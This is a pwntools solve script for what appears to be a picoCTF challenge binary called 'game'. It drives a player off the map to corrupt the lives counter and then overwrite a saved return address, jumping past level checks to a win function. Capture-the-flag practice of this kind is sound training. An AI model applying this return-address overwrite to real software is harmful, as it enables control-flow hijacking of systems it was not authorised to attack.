from pwn import *
from enum import Enum

class Direction(Enum):
    UP = "w"
    DOWN = "s"
    LEFT = "a"
    RIGHT = "d"

class Player:
    MAP_OFFSET = 0x0c
    def __init__(self, x, y):
        self.x = x
        self.y = y

    def moveto(self, x, y):
        if x < self.x:
            self.move(Direction.LEFT, self.x - x)
        elif x > self.x:
            self.move(Direction.RIGHT, x - self.x)

        if y < self.y:
            self.move(Direction.UP, self.y - y)
        elif y > self.y:
            self.move(Direction.DOWN, y - self.y)

    def move(self, direction, times=1):
        if times <= 0:
            return
        p.sendline(direction.value.encode()*times)
        if direction == Direction.UP:
            self.y -= times
        elif direction == Direction.DOWN:
            self.y += times
        elif direction == Direction.LEFT:
            self.x -= times
        elif direction == Direction.RIGHT:
            self.x += times

    @property
    def address(self):
        return (self.x + self.y * 0x59) & 0xffff_ffff


elf = context.binary = ELF('./game')

p = process()
#p = remote("rhea.picoctf.net", 57955)

p.recvuntil(b"Player position: ").decode()
pos = p.recvline().decode().strip().split()
pos = (int(pos[0]), int(pos[1]))
player = Player(*pos)

def heal():
    # overflow x and overwrite number of lives
    player.move(Direction.LEFT, 8)
    player.move(Direction.UP, 4)
    # player.move(Direction.LEFT, 3)

    # move back again and revert the overflow
    player.move(Direction.DOWN, 4)
    player.move(Direction.RIGHT, 8)

def solve_level():
    heal()
    p.sendline(b"p")

# # solve level 1
solve_level() # now level 2
# # solve level 2
solve_level() # now level 3
# # solve level 3
solve_level() # now level 4

# Override the return address to skip the level != 4 check
heal()
p.sendline(b"l\x70")
player.move(Direction.LEFT, 4 + 51)
player.move(Direction.UP, 3)
p.clean()
player.move(Direction.UP, 1)

# We're now at level 5!

# Do the same again and skip the last check and jump to the win function
heal()
p.sendline(b"l\xf4")
player.move(Direction.LEFT, 4 + 67)
player.move(Direction.UP, 3)
p.clean()
player.move(Direction.UP, 1)

print(p.clean().decode())
p.interactive()

